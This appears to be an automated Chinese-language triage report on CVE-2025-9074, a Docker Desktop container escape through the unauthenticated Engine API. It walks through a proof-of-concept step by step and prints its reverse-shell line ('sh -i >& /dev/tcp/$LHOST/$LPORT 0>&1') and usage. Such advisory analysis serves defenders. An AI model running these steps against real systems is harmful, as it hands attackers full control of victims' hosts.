## CVE-2025-9074 - Docker Desktop 容器逃逸 (Container Escape), 未授权远程代码执行 (Unauthenticated Remote Code Execution - RCE)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸 (Container Escape), 未授权远程代码执行 (Unauthenticated Remote Code Execution - RCE)

**影响应用:** Docker Desktop

**危害等级:** 高危 (High)

**CVSS评分:** 9.3

**影响版本:** 影响Windows和macOS版本的Docker Desktop，已于2025年8月20日在Docker Desktop 4.44.3版本中修复。受影响版本为Docker Desktop < 4.44.3。

**利用条件:** 攻击者需要在本地运行的恶意Linux容器中发起攻击，通过默认子网(192.168.65.7:2375)直接访问Docker Engine API。该漏洞利用无需认证，不依赖于容器挂载配置，也不受增强容器隔离(ECI)或TCP暴露设置的影响。

**POC 可用性:** 10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 0%

## 详情

CVE-2025-9074是一个存在于Docker Desktop应用程序中的高危漏洞，允许在Windows和macOS系统上本地运行的恶意Linux容器绕过隔离机制，通过默认子网（192.168.65.7:2375）直接访问Docker Engine API。该漏洞的严重评分为9.3（CVSS），可导致攻击者突破容器隔离，获得对宿主机的完全控制，包括未经授权访问用户文件，并执行任意代码。此漏洞不依赖于文件挂载或特定的TCP暴露设置，也绕过了增强容器隔离（ECI）。Docker已于2025年8月20日在Docker Desktop 4.44.3版本中修复此漏洞，因此所有低于此版本的Docker Desktop用户均受影响。

**POC有效性分析**
提供的POC代码是一个Bash脚本（`exploit.sh`），它实现了对CVE-2025-9074的完整利用。该脚本无任何外部依赖，仅使用标准Linux工具如`curl`和`grep`。其核心利用逻辑在于利用了Docker Engine API的未授权访问，在受害主机上创建一个特权容器。此容器被配置为挂载宿主机的根目录（`/`）到容器内的`/host`路径，并且以`Privileged`模式运行，同时使用宿主机的网络模式。随后，脚本通过在特权容器内执行`chroot /host /bin/sh -c 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1'`命令，成功在宿主机根文件系统上启动一个反向shell，从而实现对宿主机的远程代码执行（RCE）。经分析，该POC代码逻辑清晰、步骤完整，能够有效复现漏洞，并取得宿主机的控制权。它通过自动化容器创建、配置和启动过程，极大地降低了攻击的门槛，使其成为一个功能完整的利用工具。

**利用步骤**
1.  攻击者首先需要在已安装并运行Docker Desktop的Windows或macOS系统上，成功运行一个恶意的Linux容器。
2.  在恶意容器内部，攻击者执行POC脚本（`exploit.sh`），并提供攻击者监听主机（LHOST）和端口（LPORT）作为参数，例如：`./exploit.sh -l <LHOST> -p <LPORT>`。脚本会自动尝试连接Docker Desktop的默认API地址（192.168.65.7:2375）。
3.  脚本通过未授权的Docker Engine API，查询现有镜像，并利用其中一个镜像创建一个新的容器。
4.  新创建的容器配置为特权模式（`Privileged: true`），网络模式为`host`，并将宿主机的根目录（`/`）挂载到容器内的`/host`目录。
5.  容器启动后，其`Cmd`指令会执行一个`chroot`命令，将根目录切换到宿主机的`/host`，并在宿主机环境中执行一个反向shell命令（`sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1`）。
6.  攻击者在监听主机上通过`netcat`或类似工具监听指定的LPORT，成功接收到来自受害宿主机的反向shell，从而获得宿主机的完全控制权限。

**投毒风险分析**
该POC代码的投毒风险极低（0%）。代码是一个纯粹的Bash脚本，结构简单、逻辑透明，仅使用了`curl`、`grep`、`cut`等标准命令行工具，没有引入任何外部或非标准的库。脚本的核心功能是利用Docker API进行容器操作以实现逃逸和RCE，其包含的反向shell payload是安全研究中常见的利用方式，并非恶意投毒行为。代码中没有发现混淆、加密、下载并执行外部可疑脚本、修改系统关键文件、创建后门账户或进行其他潜在恶意行为的迹象。所有操作均是出于漏洞利用的目的，且清晰可见，易于审计。因此，可以判断该POC代码是合法的安全研究产物，不具备投毒风险。

**项目地址:** 未提供

**漏洞详情:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9074
